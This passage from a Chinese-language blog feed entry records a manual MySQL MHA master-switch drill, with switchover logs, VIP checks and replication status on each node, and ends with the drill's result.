+--10.25.1.67(10.25.1.67:3306)</span><br><span class="line"> +--10.25.1.68(10.25.1.68:3306)</span><br><span class="line"></span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info] Checking replication health on 10.25.1.67..</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info]  ok.</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info] Checking replication health on 10.25.1.68..</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info]  ok.</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info] Checking master_ip_failover_script status:</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info]   /root/dba/mha/script/master_ip_failover.sh --<span class="built_in">command</span>=status --ssh_user=root --orig_master_host=10.25.1.66 --orig_master_ip=10.25.1.66 --orig_master_port=3306 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IN SCRIPT TEST====/etc/init.d/keepalived stop==/etc/init.d/keepalived start===</span><br><span class="line"></span><br><span class="line">Checking the Status of the script.. OK </span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info]  OK.</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [warning] shutdown_script is not defined.</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info] Got <span class="built_in">exit</span> code 0 (Not master dead).</span><br><span class="line"></span><br><span class="line">MySQL Replication Health is OK.</span><br></pre></td></tr></tbody></table></figure><p>执行 masterha_master_switch 命令<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># masterha_master_switch --conf=/root/dba/mha/conf/babybi_#1.conf --master_state=alive --new_master_host=10.25.1.67 --new_master_port=3306 --orig_master_is_new_slave --running_updates_limit=10000</span></span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">Wed Mar 27 23:34:27 2019 - [info] MHA::MasterRotate version 0.56.</span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info] Starting online master switch..</span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info] </span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info] * Phase 1: Configuration Check Phase..</span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info] </span><br><span class="line">Wed Mar 27 23:34:27 2019 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.</span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info] Reading application default configuration from /root/dba/mha/conf/babybi_<span class="comment">#1.conf..</span></span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info] Reading server configuration from /root/dba/mha/conf/babybi_<span class="comment">#1.conf..</span></span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info] GTID failover mode = 0</span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info] Current Alive Master: 10.25.1.66(10.25.1.66:3306)</span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info] Alive Slaves:</span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info]   10.25.1.67(10.25.1.67:3306)  Version=5.6.29-76.2-log (oldest major version between slaves) <span class="built_in">log</span>-bin:enabled</span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info]     Replicating from 10.25.1.66(10.25.1.66:3306)</span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info]     Primary candidate <span class="keyword">for</span> the new Master (candidate_master is <span class="built_in">set</span>)</span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info]   10.25.1.68(10.25.1.68:3306)  Version=5.6.29-76.2-log (oldest major version between slaves) <span class="built_in">log</span>-bin:enabled</span><br><span class="line">Wed Mar 27 23:34:27 2019 - [info]     Replicating from 10.25.1.66(10.25.1.66:3306)</span><br><span class="line"></span><br><span class="line">It is better to execute FLUSH NO_WRITE_TO_BINLOG TABLES on the master before switching. Is it ok to execute on 10.25.1.66(10.25.1.66:3306)? (YES/no): ---> 输入: yes</span><br><span class="line">Wed Mar 27 23:34:34 2019 - [info] Executing FLUSH NO_WRITE_TO_BINLOG TABLES. This may take long time..</span><br><span class="line">Wed Mar 27 23:34:34 2019 - [info]  ok.</span><br><span class="line">Wed Mar 27 23:34:34 2019 - [info] Checking MHA is not monitoring or doing failover..</span><br><span class="line">Wed Mar 27 23:34:34 2019 - [info] Checking replication health on 10.25.1.67..</span><br><span class="line">Wed Mar 27 23:34:34 2019 - [info]  ok.</span><br><span class="line">Wed Mar 27 23:34:34 2019 - [info] Checking replication health on 10.25.1.68..</span><br><span class="line">Wed Mar 27 23:34:34 2019 - [info]  ok.</span><br><span class="line">Wed Mar 27 23:34:34 2019 - [info] 10.25.1.67 can be new master.</span><br><span class="line">Wed Mar 27 23:34:34 2019 - [info] </span><br><span class="line">From:</span><br><span class="line">10.25.1.66(10.25.1.66:3306) (current master)</span><br><span class="line"> +--10.25.1.67(10.25.1.67:3306)</span><br><span class="line"> +--10.25.1.68(10.25.1.68:3306)</span><br><span class="line"></span><br><span class="line">To:</span><br><span class="line">10.25.1.67(10.25.1.67:3306) (new master)</span><br><span class="line"> +--10.25.1.68(10.25.1.68:3306)</span><br><span class="line"> +--10.25.1.66(10.25.1.66:3306)</span><br><span class="line"></span><br><span class="line">Starting master switch from 10.25.1.66(10.25.1.66:3306) to 10.25.1.67(10.25.1.67:3306)? (yes/NO): ---> 输入: yes</span><br><span class="line">Wed Mar 27 23:34:37 2019 - [info] Checking whether 10.25.1.67(10.25.1.67:3306) is ok <span class="keyword">for</span> the new master..</span><br><span class="line">Wed Mar 27 23:34:37 2019 - [info]  ok.</span><br><span class="line">Wed Mar 27 23:34:37 2019 - [info] 10.25.1.66(10.25.1.66:3306): SHOW SLAVE STATUS returned empty result. To check replication filtering rules, temporarily executing CHANGE MASTER to a dummy host.</span><br><span class="line">Wed Mar 27 23:34:37 2019 - [info] 10.25.1.66(10.25.1.66:3306): Resetting slave pointing to the dummy host.</span><br><span class="line">Wed Mar 27 23:34:37 2019 - [info] ** Phase 1: Configuration Check Phase completed.</span><br><span class="line">Wed Mar 27 23:34:37 2019 - [info] </span><br><span class="line">Wed Mar 27 23:34:37 2019 - [info] * Phase 2: Rejecting updates Phase..</span><br><span class="line">Wed Mar 27 23:34:37 2019 - [info] </span><br><span class="line">Wed Mar 27 23:34:37 2019 - [info] Executing master ip online change script to <span class="built_in">disable</span> write on the current master:</span><br><span class="line">Wed Mar 27 23:34:37 2019 - [info]   /root/dba/mha/script/master_ip_online_change.sh --<span class="built_in">command</span>=stop --orig_master_host=10.25.1.66 --orig_master_ip=10.25.1.66 --orig_master_port=3306 --orig_master_user=<span class="string">'mha'</span> --orig_master_password=<span class="string">'mhapassword'</span> --new_master_host=10.25.1.67 --new_master_ip=10.25.1.67 --new_master_port=3306 --new_master_user=<span class="string">'mha'</span> --new_master_password=<span class="string">'mhapassword'</span> --orig_master_ssh_user=root --new_master_ssh_user=root   --orig_master_is_new_slave</span><br><span class="line">2019-03-27 23:34:38 set_mysql_read_only successful!</span><br><span class="line">Stopping keepalived: [  OK  ]</span><br><span class="line">2019-03-27 23:34:38 stop_keepalived successful!</span><br><span class="line">Wed Mar 27 23:34:38 2019 - [info]  ok.</span><br><span class="line">Wed Mar 27 23:34:38 2019 - [info] Locking all tables on the orig master to reject updates from everybody (including root):</span><br><span class="line">Wed Mar 27 23:34:38 2019 - [info] Executing FLUSH TABLES WITH READ LOCK..</span><br><span class="line">Wed Mar 27 23:34:38 2019 - [info]  ok.</span><br><span class="line">Wed Mar 27 23:34:38 2019 - [info] Orig master binlog:pos is mysql-bin.004691:854373586.</span><br><span class="line">Wed Mar 27 23:34:38 2019 - [info]  Waiting to execute all relay logs on 10.25.1.67(10.25.1.67:3306)..</span><br><span class="line">Wed Mar 27 23:34:38 2019 - [info]  master_pos_wait(mysql-bin.004691:854373586) completed on 10.25.1.67(10.25.1.67:3306). Executed 0 events.</span><br><span class="line">Wed Mar 27 23:34:38 2019 - [info]   <span class="keyword">done</span>.</span><br><span class="line">Wed Mar 27 23:34:38 2019 - [info] Getting new master<span class="string">'s binlog name and position..</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info]  mysql-bin.000001:120</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info]  All other slaves should start replication from here. Statement should be: CHANGE MASTER TO MASTER_HOST='</span>10.25.1.67<span class="string">', MASTER_PORT=3306, MASTER_LOG_FILE='</span>mysql-bin.000001<span class="string">', MASTER_LOG_POS=120, MASTER_USER='</span>repl<span class="string">', MASTER_PASSWORD='</span>xxx<span class="string">';</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info] Executing master ip online change script to allow write on the new master:</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info]   /root/dba/mha/script/master_ip_online_change.sh --command=start --orig_master_host=10.25.1.66 --orig_master_ip=10.25.1.66 --orig_master_port=3306 --orig_master_user='</span>mha<span class="string">' --orig_master_password='</span>mhapassword<span class="string">' --new_master_host=10.25.1.67 --new_master_ip=10.25.1.67 --new_master_port=3306 --new_master_user='</span>mha<span class="string">' --new_master_password='</span>mhapassword<span class="string">' --orig_master_ssh_user=root --new_master_ssh_user=root   --orig_master_is_new_slave</span></span><br><span class="line"><span class="string">Starting keepalived: [  OK  ]</span></span><br><span class="line"><span class="string">2019-03-27 23:34:38 start_keepalived successful!</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info]  ok.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info] Setting read_only=0 on 10.25.1.67(10.25.1.67:3306)..</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info]  ok.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info] </span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info] * Switching slaves in parallel..</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info] </span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info] -- Slave switch on host 10.25.1.68(10.25.1.68:3306) started, pid: 20673</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info] </span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info] Log messages from 10.25.1.68 ...</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] </span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info]  Waiting to execute all relay logs on 10.25.1.68(10.25.1.68:3306)..</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info]  master_pos_wait(mysql-bin.004691:854373586) completed on 10.25.1.68(10.25.1.68:3306). Executed 0 events.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info]   done.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info]  Resetting slave 10.25.1.68(10.25.1.68:3306) and starting replication from the new master 10.25.1.67(10.25.1.67:3306)..</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info]  Executed CHANGE MASTER.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:38 2019 - [info]  Slave started.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] End of log messages from 10.25.1.68 ...</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] </span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] -- Slave switch on host 10.25.1.68(10.25.1.68:3306) succeeded.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] Unlocking all tables on the orig master:</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] Executing UNLOCK TABLES..</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info]  ok.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] Starting orig master as a new slave..</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info]  Resetting slave 10.25.1.66(10.25.1.66:3306) and starting replication from the new master 10.25.1.67(10.25.1.67:3306)..</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info]  Executed CHANGE MASTER.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info]  Slave started.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] All new slave servers switched successfully.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] </span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] * Phase 5: New master cleanup phase..</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] </span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info]  10.25.1.67: Resetting slave info succeeded.</span></span><br><span class="line"><span class="string">Wed Mar 27 23:34:39 2019 - [info] Switching master to 10.25.1.67(10.25.1.67:3306) completed successfully.</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ps -ef|grep babybi_#1.conf</span></span><br><span class="line">root      3578     1  0 Jan08 ?        00:42:35 perl /usr/bin/masterha_manager --conf=/root/dba/mha/conf/babybi_<span class="comment">#1.conf --ignore_last_failover</span></span><br><span class="line">root     21082 17518  0 23:35 pts/0    00:00:00 grep --colour=auto babybi_<span class="comment">#1.conf</span></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><p>到new_master机器中查看VIP有没有绑定过来到网卡上<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ip a</span></span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN </span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: em1: <BROADCAST,MULTICAST,SLAVE,UP,LOWER_UP> mtu 1500 qdisc mq master bond0 state UP qlen 1000</span><br><span class="line">    link/ether 24:6e:96:13:61:30 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">3: em2: <BROADCAST,MULTICAST,SLAVE,UP,LOWER_UP> mtu 1500 qdisc mq master bond0 state UP qlen 1000</span><br><span class="line">    link/ether 24:6e:96:13:61:30 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">4: em3: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN qlen 1000</span><br><span class="line">    link/ether 24:6e:96:13:61:34 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">5: em4: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN qlen 1000</span><br><span class="line">    link/ether 24:6e:96:13:61:35 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">6: bond0: <BROADCAST,MULTICAST,MASTER,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP </span><br><span class="line">    link/ether 24:6e:96:13:61:30 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.25.1.67/24 brd 10.25.1.255 scope global bond0</span><br><span class="line">    inet 10.25.1.203/32 scope global bond0</span><br><span class="line">    inet6 fe80::266e:96ff:fe13:6130/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></tbody></table></figure><p>登录到slave机器上<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">mysql> show slave status\G</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection id:    2049252955</span><br><span class="line">Current database: *** NONE ***</span><br><span class="line"></span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">               Slave_IO_State: Waiting <span class="keyword">for</span> master to send event</span><br><span class="line">                  Master_Host: 10.25.1.67</span><br><span class="line">                  Master_User: repl</span><br><span class="line">                  Master_Port: 3306</span><br><span class="line">                Connect_Retry: 60</span><br><span class="line">              Master_Log_File: mysql-bin.000001</span><br><span class="line">          Read_Master_Log_Pos: 62528</span><br><span class="line">               Relay_Log_File: relay-log.000002</span><br><span class="line">                Relay_Log_Pos: 62691</span><br><span class="line">        Relay_Master_Log_File: mysql-bin.000001</span><br><span class="line">             Slave_IO_Running: Yes</span><br><span class="line">            Slave_SQL_Running: Yes</span><br><span class="line">              Replicate_Do_DB: </span><br><span class="line">          Replicate_Ignore_DB: </span><br><span class="line">           Replicate_Do_Table: </span><br><span class="line">       Replicate_Ignore_Table: </span><br><span class="line">      Replicate_Wild_Do_Table: </span><br><span class="line">  Replicate_Wild_Ignore_Table: </span><br><span class="line">                   Last_Errno: 0</span><br><span class="line">                   Last_Error: </span><br><span class="line">                 Skip_Counter: 0</span><br><span class="line">          Exec_Master_Log_Pos: 62528</span><br><span class="line">              Relay_Log_Space: 62858</span><br><span class="line">              Until_Condition: None</span><br><span class="line">               Until_Log_File: </span><br><span class="line">                Until_Log_Pos: 0</span><br><span class="line">           Master_SSL_Allowed: No</span><br><span class="line">           Master_SSL_CA_File: </span><br><span class="line">           Master_SSL_CA_Path: </span><br><span class="line">              Master_SSL_Cert: </span><br><span class="line">            Master_SSL_Cipher: </span><br><span class="line">               Master_SSL_Key: </span><br><span class="line">        Seconds_Behind_Master: 0</span><br><span class="line">Master_SSL_Verify_Server_Cert: No</span><br><span class="line">                Last_IO_Errno: 0</span><br><span class="line">                Last_IO_Error: </span><br><span class="line">               Last_SQL_Errno: 0</span><br><span class="line">               Last_SQL_Error: </span><br><span class="line">  Replicate_Ignore_Server_Ids: </span><br><span class="line">             Master_Server_Id: 1673306</span><br><span class="line">                  Master_UUID: ca479c32-fa0d-11e8-bc0f-246e96136130</span><br><span class="line">             Master_Info_File: /my/data/percona/master.info</span><br><span class="line">                    SQL_Delay: 0</span><br><span class="line">          SQL_Remaining_Delay: NULL</span><br><span class="line">      Slave_SQL_Running_State: Slave has <span class="built_in">read</span> all relay <span class="built_in">log</span>; waiting <span class="keyword">for</span> the slave I/O thread to update it</span><br><span class="line">           Master_Retry_Count: 86400</span><br><span class="line">                  Master_Bind: </span><br><span class="line">      Last_IO_Error_Timestamp: </span><br><span class="line">     Last_SQL_Error_Timestamp: </span><br><span class="line">               Master_SSL_Crl: </span><br><span class="line">           Master_SSL_Crlpath: </span><br><span class="line">           Retrieved_Gtid_Set: </span><br><span class="line">            Executed_Gtid_Set: </span><br><span class="line">                Auto_Position: 0</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql></span><br></pre></td></tr></tbody></table></figure><p></p><p>正常 CHANGE MASTER TO NEW_MASTER </p><p>登录到old_master中查看<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">mysql> show slave status\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">               Slave_IO_State: Waiting <span class="keyword">for</span> master to send event</span><br><span class="line">                  Master_Host: 10.25.1.67</span><br><span class="line">                  Master_User: repl</span><br><span class="line">                  Master_Port: 3306</span><br><span class="line">                Connect_Retry: 60</span><br><span class="line">              Master_Log_File: mysql-bin.000001</span><br><span class="line">          Read_Master_Log_Pos: 66875</span><br><span class="line">               Relay_Log_File: relay-log.000002</span><br><span class="line">                Relay_Log_Pos: 67038</span><br><span class="line">        Relay_Master_Log_File: mysql-bin.000001</span><br><span class="line">             Slave_IO_Running: Yes</span><br><span class="line">            Slave_SQL_Running: Yes</span><br><span class="line">              Replicate_Do_DB: </span><br><span class="line">          Replicate_Ignore_DB: </span><br><span class="line">           Replicate_Do_Table: </span><br><span class="line">       Replicate_Ignore_Table: </span><br><span class="line">      Replicate_Wild_Do_Table: </span><br><span class="line">  Replicate_Wild_Ignore_Table: </span><br><span class="line">                   Last_Errno: 0</span><br><span class="line">                   Last_Error: </span><br><span class="line">                 Skip_Counter: 0</span><br><span class="line">          Exec_Master_Log_Pos: 66875</span><br><span class="line">              Relay_Log_Space: 67205</span><br><span class="line">              Until_Condition: None</span><br><span class="line">               Until_Log_File: </span><br><span class="line">                Until_Log_Pos: 0</span><br><span class="line">           Master_SSL_Allowed: No</span><br><span class="line">           Master_SSL_CA_File: </span><br><span class="line">           Master_SSL_CA_Path: </span><br><span class="line">              Master_SSL_Cert: </span><br><span class="line">            Master_SSL_Cipher: </span><br><span class="line">               Master_SSL_Key: </span><br><span class="line">        Seconds_Behind_Master: 0</span><br><span class="line">Master_SSL_Verify_Server_Cert: No</span><br><span class="line">                Last_IO_Errno: 0</span><br><span class="line">                Last_IO_Error: </span><br><span class="line">               Last_SQL_Errno: 0</span><br><span class="line">               Last_SQL_Error: </span><br><span class="line">  Replicate_Ignore_Server_Ids: </span><br><span class="line">             Master_Server_Id: 1673306</span><br><span class="line">                  Master_UUID: ca479c32-fa0d-11e8-bc0f-246e96136130</span><br><span class="line">             Master_Info_File: /my/data/percona/master.info</span><br><span class="line">                    SQL_Delay: 0</span><br><span class="line">          SQL_Remaining_Delay: NULL</span><br><span class="line">      Slave_SQL_Running_State: Slave has <span class="built_in">read</span> all relay <span class="built_in">log</span>; waiting <span class="keyword">for</span> the slave I/O thread to update it</span><br><span class="line">           Master_Retry_Count: 86400</span><br><span class="line">                  Master_Bind: </span><br><span class="line">      Last_IO_Error_Timestamp: </span><br><span class="line">     Last_SQL_Error_Timestamp: </span><br><span class="line">               Master_SSL_Crl: </span><br><span class="line">           Master_SSL_Crlpath: </span><br><span class="line">           Retrieved_Gtid_Set: </span><br><span class="line">            Executed_Gtid_Set: </span><br><span class="line">                Auto_Position: 0</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql></span><br></pre></td></tr></tbody></table></figure><p></p><p>到new_master上查看<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ps -ef|grep keepalived</span><br><span class="line">root     37477     1  0 23:41 ?        00:00:00 /usr/sbin/keepalived -D</span><br><span class="line">root     37478 37477  0 23:41 ?        00:00:00 /usr/sbin/keepalived -D</span><br><span class="line">root     37479 37477  0 23:41 ?        00:00:00 /usr/sbin/keepalived -D</span><br><span class="line">dbctl    38747 35598  0 23:49 pts/0    00:00:00 grep --colour=auto keepalived</span><br></pre></td></tr></tbody></table></figure><p></p><h5 id="在切换回来到old-master提成为master"><a href="#在切换回来到old-master提成为master" class="headerlink" title="在切换回来到old_master提成为master"></a>在切换回来到old_master提成为master</h5><p>步骤按照上面操作，就不重复搬砖了。</p><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>MHA 高可用集群切换成功，虽然是手动MHA failover测试，并不能代表MHA的高可用。以后还会按照上面缩写的步骤在加上一定的主从数据同步延迟来进行演练。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;昨天公司要进行线上MHA高可用集群故障切换演练。由于我刚入职公司。公司还没有做过太多的灾难级别的故障演练。&lt;/p&gt;
&lt;h5 id=&quot;我写了一
      
    
    </summary>
    
      <category term="MySQL" scheme="https://jiemin.wang/categories/MySQL/"/>
    
      <category term="MHA" scheme="https://jiemin.wang/categories/MySQL/MHA/"/>
    
    
      <category term="MySQL" scheme="https://jiemin.wang/tags/MySQL/"/>
    
      <category term="MHA" scheme="https://jiemin.wang/tags/MHA/"/>
    
  </entry>
  
